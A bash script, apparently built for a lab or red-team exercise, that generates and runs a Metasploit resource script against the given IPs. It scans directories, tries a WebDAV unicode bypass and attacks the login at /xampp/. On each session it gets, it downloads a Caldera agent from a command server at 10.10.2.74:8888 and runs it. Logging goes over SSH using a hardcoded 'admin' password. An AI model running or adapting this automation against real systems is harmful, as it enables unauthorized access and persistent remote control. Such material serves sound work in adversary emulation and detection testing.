#!/bin/bash

if [ "$#" -eq 0 ]; then
  echo "Usage: $0 <ip_address1> [<ip_address2> ...]"
  exit 1
fi
# collect the number of IPs
num_IPs=$(( $# ))
sleep_time=$((10 * num_IPs))
# collect the IP adresses in IPs variable
IPs=""
for ip in "$@"; do
  IPs="$IPs $ip"
done
# Caldera agent setup command on local
caldera_agent_command='server="http://10.10.2.74:8888"; curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > caldera; chmod +x caldera; ./caldera -server $server -group red&'
# log file path
log_path="/home/ubuntu/attack_logs/http_exploit_log_$(date +'%Y-%m-%d_%H:%M:%S').log"
log_server="10.10.2.74"
# Create a resource script to execute exploit in `msfconsole` 
# Directory scan
echo "use auxiliary/scanner/http/dir_scanner" > http_exploit_msfconsole.rc
echo "echo \"\$(date +'%Y-%m-%d %H:%M:%S.%N') http exploit : Scanning Directories\" | sshpass -p \"admin\" ssh ubuntu@$log_server \"cat >> $log_path\"" >> http_exploit_msfconsole.rc
echo "set RHOSTS $IPs" >> http_exploit_msfconsole.rc
echo "exploit -j" >> http_exploit_msfconsole.rc
# wait for exploit to finish
echo "sleep $sleep_time" >> http_exploit_msfconsole.rc
# dir scan: Allows us to list download and upload files to a password protected file
echo "echo \"\$(date +'%Y-%m-%d %H:%M:%S.%N') http exploit : Directory scan: unicode bypass\" | sshpass -p \"admin\" ssh ubuntu@$log_server \"cat >> $log_path\"" >> http_exploit_msfconsole.rc
echo "use auxiliary/scanner/http/dir_webdav_unicode_bypass" >> http_exploit_msfconsole.rc
echo "set RHOSTS $IPs" >> http_exploit_msfconsole.rc
echo "set threads 20" >> http_exploit_msfconsole.rc
echo "exploit -j" >> http_exploit_msfconsole.rc
# wait for exploit to finish
echo "sleep $sleep_time" >> http_exploit_msfconsole.rc
# dir scan general
echo "echo \"\$(date +'%Y-%m-%d %H:%M:%S.%N') http exploit : Directory scan: general scan\" | sshpass -p \"admin\" ssh ubuntu@$log_server \"cat >> $log_path\"" >> http_exploit_msfconsole.rc
echo "use auxiliary/scanner/http/files_dir" >> http_exploit_msfconsole.rc
echo "set RHOSTS $IPs" >> http_exploit_msfconsole.rc
echo "exploit -j" >> http_exploit_msfconsole.rc
# exploit http login
echo "echo \"\$(date +'%Y-%m-%d %H:%M:%S.%N') http exploit : Exploit http login\" | sshpass -p \"admin\" ssh ubuntu@$log_server \"cat >> $log_path\"" >> http_exploit_msfconsole.rc
echo "use auxiliary/scanner/http/http_login" >> http_exploit_msfconsole.rc
echo "set RHOSTS $IPs" >> http_exploit_msfconsole.rc
echo "set AUTH_URI /xampp/" >> http_exploit_msfconsole.rc
echo "exploit -j" >> http_exploit_msfconsole.rc
# wait for exploit to finish
echo "sleep $sleep_time" >> http_exploit_msfconsole.rc
# open the sessions and run command
echo "echo \"\$(date +'%Y-%m-%d %H:%M:%S.%N') http exploit : Access backdoors and execute commands\" | sshpass -p \"admin\" ssh ubuntu@$log_server \"cat >> $log_path\"" >> http_exploit_msfconsole.rc
for id in $(seq 1 $num_IPs); do
  echo "sessions -i $id -c '$caldera_agent_command'" >> http_exploit_msfconsole.rc
  echo "sleep 5" >> http_exploit_msfconsole.rc
done
# exploit run
msfconsole -r http_exploit_msfconsole.rc